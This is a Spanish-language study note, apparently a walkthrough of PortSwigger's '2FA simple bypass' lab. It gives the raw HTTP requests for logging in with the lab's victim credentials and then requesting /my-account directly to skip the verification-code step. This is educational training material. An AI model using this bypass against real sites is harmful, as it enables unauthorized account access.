---
aliases:
  - Authentication 002 - bypass simple de 2FA
  - 2FA simple bypass
tags:
  - vuln/authentication
  - example
  - portswigger
---

# 002 — Bypass simple de 2FA (navegar directo al recurso)

> Lab: [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass) · **Apprentice** · técnica → [[vulnerabilities/029-authentication/authentication|entry point]]

## ¿Por qué acá? (el 2FA más barato de romper)
- **Ya tenés las credenciales** (de [[vulnerabilities/029-authentication/examples/001-username-enumeration-brute-force|001]] o dadas) y el server te pide el código de verificación. Antes de tocar el código, probás si el 2FA **es sólo una pantalla**.
- **Por qué funciona:** el server te da una **sesión válida ya en la 1ª fase** (user+pass) y **no comprueba** que hayas pasado el 2FA cuando pedís una página autenticada → simplemente **navegás directo** al recurso protegido.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (host del lab, creds).

Logueá la **primera fase** con las creds de la víctima:
<pre class="payload"><code>POST /login HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Content-Type: application/x-www-form-urlencoded

username=<mark>carlos</mark>&password=<mark>montoya</mark></code></pre>
Te lleva a `/login2` (pide el código). **Ignoralo** y pedí directamente el recurso protegido:
<pre class="payload"><code>GET <mark>/my-account</mark> HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Cookie: session=&lt;la de la 1ª fase&gt;</code></pre>

## Verificación
`GET /my-account` devuelve **200** con la cuenta de carlos (no te redirige a `/login2`) → 2FA salteado, lab resuelto.

## Detalles que se pasan por alto
- Con las **creds propias** primero mapeás el flujo completo (qué endpoint es el post-login) y después repetís con la víctima.
- La cookie de sesión de la 1ª fase **ya vale**: el fallo es que el 2FA no cambia el estado de la sesión.
- Si el server **sí** valida el 2FA para `/my-account`, no es simple bypass → pasás a la **lógica rota / brute del código** → [[vulnerabilities/029-authentication/examples/003-2fa-brute-force-codigo|003]].

→ Siguiente: [[vulnerabilities/029-authentication/examples/003-2fa-brute-force-codigo|003 · el 2FA se valida: fuerza bruta del código de 4 dígitos]]
